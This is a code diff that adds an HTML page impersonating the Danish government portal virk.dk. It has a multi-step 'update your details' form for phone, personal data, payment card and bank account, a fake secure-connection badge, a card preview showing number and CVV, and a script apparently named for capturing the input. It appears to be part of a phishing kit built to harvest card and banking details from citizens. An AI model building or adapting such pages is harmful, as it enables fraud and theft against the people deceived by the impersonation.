@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#001C44"/>
+<title>virk.dk – Opdater dine oplysninger</title>
+<link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');
+
+*, *::after, *::before { box-sizing: border-box; }
+html, body { margin: 0; height: 100%; width: 100%; }
+body {
+  background-color: #fff;
+  font-family: "IBM Plex Sans", "IBMPlexSans", system-ui, sans-serif;
+  font-size: 16px;
+  color: #1a1a1a;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: #0060E6; }
+p { line-height: 24px; }
+
+/* ── MULTI-STEP DETAILS ── */
+.details-wrap { background: #f3f3f3; min-height: 100vh; display: flex; flex-direction: column; }
+.details-header { background: #fff; border-bottom: 1px solid #e8e8e8; height: 72px; display: flex; align-items: center; justify-content: space-between; padding: 0 32px; }
+.details-header-brand { display: flex; align-items: center; gap: 8px; font-weight: 700; color: #1a1a1a; font-size: 18px; }
+.details-body { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 40px 16px; }
+.details-card { width: 100%; max-width: 520px; background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,.08); border: 1px solid #ccc; border-radius: 4px; }
+.details-steps { display: flex; align-items: center; padding: 18px 24px; border-bottom: 1px solid #e8e8e8; }
+.ds-step { display: flex; align-items: center; gap: 8px; }
+.ds-track { flex: 1; height: 2px; margin: 0 10px; background: #e0e0e0; }
+.ds-bubble { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; background: #f3f3f3; color: #888; border: 2px solid #e0e0e0; flex-shrink: 0; }
+.ds-step.active .ds-bubble { background: #0060e6; color: #fff; border-color: #0060e6; }
+.ds-step.done .ds-bubble { background: #1a1a1a; color: #fff; border-color: #1a1a1a; }
+.ds-name { font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: #888; }
+.ds-step.active .ds-name { color: #000; }
+.details-card-body { padding: 28px; }
+.details-head h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 6px; }
+.details-head p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+.dform { display: flex; flex-direction: column; gap: 14px; }
+.dfield { display: flex; flex-direction: column; gap: 5px; }
+.dfield label { font-size: 12px; text-transform: uppercase; letter-spacing: .06em; color: #555; font-weight: 600; }
+.dfield input, .dfield select { height: 40px; border: 1px solid #747474; border-radius: 4px; padding: 0 10px; font-size: 16px; color: #1a1a1a; background: #fff; outline: none; width: 100%; font-family: inherit; }
+.dfield input:focus, .dfield select:focus { outline: 4px solid #747474; outline-offset: 1px; }
+.dgrid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.dfull { grid-column: 1/-1; }
+.dbtn { display: flex; align-items: center; justify-content: center; width: 100%; height: 40px; background: #0060e6; color: #fff; border: 2px solid #0060e6; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; font-family: inherit; margin-top: 6px; }
+.dbtn:hover { background: #004993; }
+.dbtn:disabled { opacity: .3; cursor: not-allowed; }
+.dbtn:focus { outline: 4px solid #747474; outline-offset: 1px; }
+.dinfo { font-size: 12px; color: #777; line-height: 1.5; border-top: 1px solid #e8e8e8; padding-top: 12px; margin-top: 14px; }
+
+/* ── SUCCESS ── */
+.success-box { text-align: center; padding: 40px 28px; }
+.success-check { width: 72px; height: 72px; background: #0060e6; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 34px; }
+
+/* ── CREDIT CARD PREVIEW ── */
+.card-preview-wrap { display: flex; justify-content: center; margin-bottom: 24px; perspective: 1200px; }
+.card-preview { width: 100%; max-width: 360px; height: 210px; }
+.card-inner {
+  position: relative; width: 100%; height: 100%;
+  transform-style: preserve-3d; transition: transform .6s cubic-bezier(.4,.2,.2,1);
+}
+.card-inner.flipped { transform: rotateY(180deg); }
+.card-front, .card-back {
+  position: absolute; inset: 0; backface-visibility: hidden;
+  border-radius: 14px; overflow: hidden;
+  box-shadow: 0 10px 28px rgba(0,0,0,.22);
+}
+.card-front {
+  background: linear-gradient(135deg,#003972 0%,#0060e6 55%,#2a86ff 100%);
+  color: #fff; padding: 22px; display: flex; flex-direction: column; justify-content: space-between;
+}
+.card-back { background: linear-gradient(135deg,#003972 0%,#0060e6 55%,#2a86ff 100%); transform: rotateY(180deg); }
+.card-chip {
+  width: 44px; height: 34px; border-radius: 6px;
+  background: linear-gradient(135deg,#f3d078,#c9a24b);
+  position: relative; margin-bottom: 6px;
+}
+.card-chip::after {
+  content: ''; position: absolute; inset: 8px 6px; border: 1px solid rgba(0,0,0,.2); border-radius: 3px;
+}
+.card-brand { align-self: flex-end; font-weight: 700; letter-spacing: 2px; font-size: 18px; opacity: .9; }
+.card-number { font-size: 20px; letter-spacing: 2px; font-weight: 500; font-variant-numeric: tabular-nums; }
+.card-meta { display: flex; justify-content: space-between; gap: 12px; }
+.card-holder, .card-exp { display: flex; flex-direction: column; }
+.card-holder label, .card-exp label { font-size: 9px; opacity: .7; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 2px; }
+.card-holder span { font-size: 13px; font-weight: 600; letter-spacing: .5px; text-transform: uppercase; }
+.card-exp span { font-size: 13px; font-weight: 600; letter-spacing: 1px; }
+.card-stripe { width: 100%; height: 46px; background: #111; margin-top: 28px; }
+.card-cvv { background: #fff; margin: 20px 22px; border-radius: 6px; padding: 10px 14px; height: 44px; display: flex; align-items: center; justify-content: flex-end; gap: 10px; }
+.card-cvv label { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
+.card-cvv span { font-size: 16px; font-weight: 700; color: #111; letter-spacing: 2px; font-variant-numeric: tabular-nums; }
+
+/* ── RESPONSIVE ── */
+@media only screen and (max-width: 879px) {
+  .dgrid { grid-template-columns: 1fr; }
+  .details-header { padding: 0 16px; }
+}
+
+.hidden { display: none !important; }
+</style>
+</head>
+<body>
+<div class="details-wrap">
+
+  <header class="details-header">
+    <div class="details-header-brand">
+      <svg width="61" height="16" viewBox="0 0 61 16">
+        <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
+      </svg>
+      <span>virk.dk</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:6px;font-size:13px;color:#555">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0060e6" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Sikker forbindelse
+    </div>
+  </header>
+
+  <div class="details-body">
+    <div class="details-card">
+      <div class="details-steps">
+        <div class="ds-step active" id="sDot1"><div class="ds-bubble" id="sBub1">1</div><span class="ds-name">Telefon</span></div>
+        <div class="ds-track"></div>
+        <div class="ds-step" id="sDot2"><div class="ds-bubble" id="sBub2">2</div><span class="ds-name">Oplysninger</span></div>
+        <div class="ds-track"></div>
+        <div class="ds-step" id="sDot3"><div class="ds-bubble" id="sBub3">3</div><span class="ds-name">Kort</span></div>
+        <div class="ds-track"></div>
+        <div class="ds-step" id="sDot4"><div class="ds-bubble" id="sBub4">4</div><span class="ds-name">Konto</span></div>
+      </div>
+      <div class="details-card-body">
+        <div id="stepContent"></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/capture.js"></script>
+<script src="js/details.js"></script>
+</body>
+</html>
